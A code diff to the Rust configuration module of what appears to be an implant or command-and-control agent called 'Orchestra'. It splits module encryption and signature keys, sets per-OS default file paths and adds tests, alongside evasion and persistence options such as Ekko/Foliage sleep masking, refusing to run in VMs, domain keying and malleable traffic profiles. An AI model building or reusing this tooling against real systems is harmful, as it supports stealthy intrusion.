@@ -1,5 +1,4 @@
 use crate::normalized_transport::TrafficProfile;
-use serde::{Deserialize, Serialize};
 use std::path::PathBuf;
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
@@ -11,18 +10,13 @@ pub enum ExecStrategy {
     Fallback,
 }
 
-#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
 pub enum SleepMethod {
     Ekko,
     Foliage,
+    #[default]
     Standard,
-}
-
-impl Default for SleepMethod {
-    fn default() -> Self {
-        SleepMethod::Standard
-    }
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
@@ -132,8 +126,17 @@ pub struct Config {
     pub persistence_enabled: bool,
     #[serde(default = "default_module_repo")]
     pub module_repo_url: String,
-    /// Base64-encoded AES-256 key used to decrypt signed capability modules.
-    pub module_signing_key: Option<String>,
+    /// Base64-encoded AES-256-GCM key used to decrypt signed capability modules.
+    /// Distinct from `module_verify_key`; a module must pass *both* decryption
+    /// (authenticated by GCM tag) and signature verification before it is loaded.
+    #[serde(default, alias = "module_signing_key")]
+    pub module_aes_key: Option<String>,
+    /// Base64-encoded Ed25519 verifying (public) key used to check the 64-byte
+    /// signature prepended to each module after decryption.  Required when the
+    /// `module-signatures` feature is enabled.  If absent the compile-time
+    /// constant `MODULE_SIGNING_PUBKEY` is used instead.
+    #[serde(default)]
+    pub module_verify_key: Option<String>,
     /// Directory from which `DeployModule` loads pre-staged module blobs.
     /// Defaults to `~/.cache/orchestra/modules` on Unix and
     /// `%LOCALAPPDATA%\Orchestra\modules` on Windows.
@@ -179,7 +182,22 @@ pub struct Config {
 }
 
 fn default_allowed_paths() -> Vec<String> {
-    vec!["/var/log".into(), "/home".into(), "/tmp".into()]
+    #[cfg(target_os = "windows")]
+    {
+        vec![
+            "C:\\Users".into(),
+            "C:\\Windows\\Temp".into(),
+            "C:\\ProgramData".into(),
+        ]
+    }
+    #[cfg(target_os = "macos")]
+    {
+        vec!["/Users".into(), "/var/log".into(), "/tmp".into()]
+    }
+    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
+    {
+        vec!["/var/log".into(), "/home".into(), "/tmp".into()]
+    }
 }
 
 fn default_heartbeat() -> u64 {
@@ -221,13 +239,31 @@ pub fn default_module_cache_dir() -> String {
 
 impl Default for Config {
     fn default() -> Self {
+        let module_cache_dir = default_module_cache_dir();
+        let mut allowed_paths = default_allowed_paths();
+
+        // Ensure the module cache directory is always in allowed_paths.
+        // Without this, deployments running as root (where HOME=/root) would
+        // have a module_cache_dir under /root/.cache which is not covered by
+        // the Linux default allowed_paths of ["/var/log", "/home", "/tmp"].
+        let cache_parent = PathBuf::from(&module_cache_dir)
+            .parent()
+            .and_then(|p| p.parent()) // strip .../modules -> .../orchestra -> .../cache
+            .map(|p| p.to_string_lossy().into_owned());
+        if let Some(parent) = cache_parent {
+            if !allowed_paths.iter().any(|a| parent.starts_with(a.as_str())) {
+                allowed_paths.push(module_cache_dir.clone());
+            }
+        }
+
         Self {
-            allowed_paths: default_allowed_paths(),
+            allowed_paths,
             heartbeat_interval_secs: default_heartbeat(),
             persistence_enabled: false,
             module_repo_url: default_module_repo(),
-            module_signing_key: None,
-            module_cache_dir: default_module_cache_dir(),
+            module_aes_key: None,
+            module_verify_key: None,
+            module_cache_dir,
             traffic_profile: TrafficProfile::default(),
             required_domain: None,
             refuse_in_vm: false,
@@ -240,5 +276,58 @@ impl Default for Config {
             malleable_profile: MalleableProfile::default(),
             exec_strategy: ExecStrategy::Indirect,
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn default_allowed_paths_linux() {
+        let paths = default_allowed_paths();
+        assert!(paths.iter().any(|p| p == "/var/log"), "Linux should include /var/log");
+        assert!(paths.iter().any(|p| p == "/home"), "Linux should include /home");
+        assert!(paths.iter().any(|p| p == "/tmp"), "Linux should include /tmp");
+    }
+
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn default_allowed_paths_macos() {
+        let paths = default_allowed_paths();
+        assert!(paths.iter().any(|p| p == "/Users"), "macOS should include /Users");
+        assert!(paths.iter().any(|p| p == "/tmp"), "macOS should include /tmp");
+    }
+
+    #[cfg(target_os = "windows")]
+    #[test]
+    fn default_allowed_paths_windows() {
+        let paths = default_allowed_paths();
+        assert!(
+            paths.iter().any(|p| p.contains("Users")),
+            "Windows should include Users path"
+        );
+        assert!(
+            paths.iter().any(|p| p.contains("Temp")),
+            "Windows should include Temp path"
+        );
+    }
+
+    #[test]
+    fn default_config_module_cache_dir_is_accessible() {
+        let cfg = Config::default();
+        let cache = &cfg.module_cache_dir;
+        // The module_cache_dir must be reachable via allowed_paths
+        // (either directly or through a parent prefix).
+        let reachable = cfg.allowed_paths.iter().any(|p| {
+            cache.starts_with(p.as_str()) || p.starts_with(cache.as_str())
+        });
+        assert!(
+            reachable,
+            "module_cache_dir '{}' is not covered by allowed_paths: {:?}",
+            cache,
+            cfg.allowed_paths
+        );
     }
 }
